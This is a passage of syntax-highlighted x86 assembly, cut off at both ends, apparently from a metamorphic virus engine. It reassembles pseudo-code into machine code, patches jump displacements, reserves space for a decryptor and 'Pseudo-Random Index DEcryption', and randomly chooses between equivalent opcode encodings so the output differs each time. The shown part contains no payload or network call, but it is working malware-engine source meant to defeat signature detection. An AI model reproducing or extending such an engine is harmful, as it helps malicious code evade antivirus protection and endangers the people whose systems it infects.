                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCheckLabel</span><span class="sc0">
   </span><span class="sc5">@@Assemble_Instruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AssembleInstruction</span><span class="sc0"> </span><span class="sc1">; Assemble the instruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">            </span><span class="sc1">; Increase pseudoassembler pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Is it the last instruction?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LoopAssemble_01</span><span class="sc0">     </span><span class="sc1">; If not, loop again</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Set the last</span><span class="sc0">
                                                            </span><span class="sc1">; instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewAssembledCode</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the size of the code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">            </span><span class="sc1">; Set a mini data frame for some</span><span class="sc0">
                                            </span><span class="sc1">; possibilities of the decryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0">     </span><span class="sc1">; Let's get the rounded size of the</span><span class="sc0">
   </span><span class="sc5">@@LoopGetRoundedSize</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; code (rounded up to 4 Kb), with a</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">      </span><span class="sc1">; minimum value of F000</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LoopGetRoundedSize</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RoundedSizeOfNewCode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">      </span><span class="sc1">; Get the size of the code rounded up</span><span class="sc0">
   </span><span class="sc5">@@LoopGetSizeP2</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; to the next power of 2 (for the</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Pseudo-Random Index DEcryption)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LoopGetSizeP2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCodeP2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

  </span><span class="sc1">;; Now we are going to complete the jumps that we left until the whole</span><span class="sc0">
  </span><span class="sc1">;; code is assembled.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpRelocationTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfJumpRelocations</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">@@LoopReloc01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the jump and the address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the destiny of the jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">      </span><span class="sc1">; Get the final address of the jump in</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">        </span><span class="sc1">;  EDX</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">; Get the displacement</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the type of jump</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">      </span><span class="sc1">; Is it a short jump?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Short</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">     </span><span class="sc1">; " " " " "?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Short</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set the displacement for long jumps,</span><span class="sc0">
     </span><span class="sc5">@@Next</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; CALLs, etc.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; Check next</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopReloc01</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Short</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; Add 3 bytes of displacement (from a</span><span class="sc0">
                                      </span><span class="sc1">; length of 5 to a length of 2)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Set the displacement</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next</span><span class="sc0">          </span><span class="sc1">; Next jump</span><span class="sc0">
</span><span class="sc5">AssembleCode</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function assembles the instruction under the pointer in ESI to the</span><span class="sc0">
</span><span class="sc1">;; buffer in EDI.</span><span class="sc0">
</span><span class="sc5">AssembleInstruction</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Set the new address of assembled code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; Get the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">        </span><span class="sc1">; Generic operation?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Assemble_Next00</span><span class="sc0"> </span><span class="sc1">; If not, check next possibility</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                   </span><span class="sc1">; Get the type of operation</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; OP Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OPRegImm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; OP Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OPRegReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">; OP Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OPRegMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; OP Mem,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OPMemReg</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPMemImm</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; OP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">                 </span><span class="sc1">; If it's 38h or below, code</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPMemImm_Normal</span><span class="sc0">              </span><span class="sc1">; it normally</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_MOVMemImm</span><span class="sc0">
     </span><span class="sc5">@@Assemble_TESTMemImm</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; TEST </span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">                    </span><span class="sc1">; Set the x86 opcode F7</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPMemImm_Normal_00</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOVMemImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; Set the x86 opcode C7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPMemImm_Normal_00</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPMemImm_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Get the value</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">                     </span><span class="sc1">; Look if we can code it</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPMemImm_Normal_Byte</span><span class="sc0"> </span><span class="sc1">; as sign-extended</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPMemImm_Normal_Byte</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPMemImm_Normal_Dword</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">             </span><span class="sc1">; Normal opcode</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPMemImm_Normal_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; Make the memory address reference</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0"> </span><span class="sc1">; adding the value in EBX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Set the value to OP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">; Increase the EIP</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">; Return</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPMemImm_Normal_Byte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Randomly choose if we code it</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OPMemImm_Normal_Dword</span><span class="sc0"> </span><span class="sc1">; as dword or sign-ext.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc0">           </span><span class="sc1">; Set the opcode 83h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; Construct the memory address</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0"> </span><span class="sc1">; reference.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the immediate to set</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; Set only a byte</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">; Return</span><span class="sc0">


     </span><span class="sc5">@@Assemble_OPRegImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">           </span><span class="sc1">; If it's a normal OP, jump</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegImm_Normal</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_MOVRegImm</span><span class="sc0">
     </span><span class="sc5">@@Assemble_TESTRegImm</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; TEST</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Get the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; If Reg=EAX, we can code it</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_TESTRegImm_NotEAX</span><span class="sc0">   </span><span class="sc1">; with its own opcode,</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">         </span><span class="sc1">; so select randomly if we do it</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_TESTRegImm_NotEAX</span><span class="sc0"> </span><span class="sc1">; Jump if we don't do it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0">             </span><span class="sc1">; Set TEST EAX,xxx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegImm_OneByteOpcode</span><span class="sc0">
     </span><span class="sc5">@@Assemble_TESTRegImm_NotEAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">             </span><span class="sc1">; Set TEST Reg,xxx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegImm_Normal_01</span><span class="sc0">

                                              </span><span class="sc1">; MOV</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOVRegImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">         </span><span class="sc1">; Get a random TRUE or FALSE</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; If FALSE, code it with a one</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_MOVRegImm_OneByteOpcode</span><span class="sc0"> </span><span class="sc1">; byte opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">             </span><span class="sc1">; Get the two bytes opcode</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegImm_Normal_01</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOVRegImm_OneByteOpcode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get the register</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">             </span><span class="sc1">; Add B8h to it to get the MOV</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegImm_OneByteOpcode</span><span class="sc0"> </span><span class="sc1">; Jump to finish</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPRegImm_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                </span><span class="sc1">; Is it EAX?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegImm_Normal_00</span><span class="sc0"> </span><span class="sc1">; If it isn't jump</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">         </span><span class="sc1">; Select randomly to code a</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; exclusive EAX opcode or not</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OPRegImm_Normal_00</span><span class="sc0"> </span><span class="sc1">; If not, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">; Add 5 to the generic opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                </span><span class="sc1">; to get an OP EAX,xxx</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPRegImm_OneByteOpcode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Store the immediate</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_OPRegImm_Normal_00</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">; 81h = normal OP Reg,Imm opcode</span><span class="sc0">
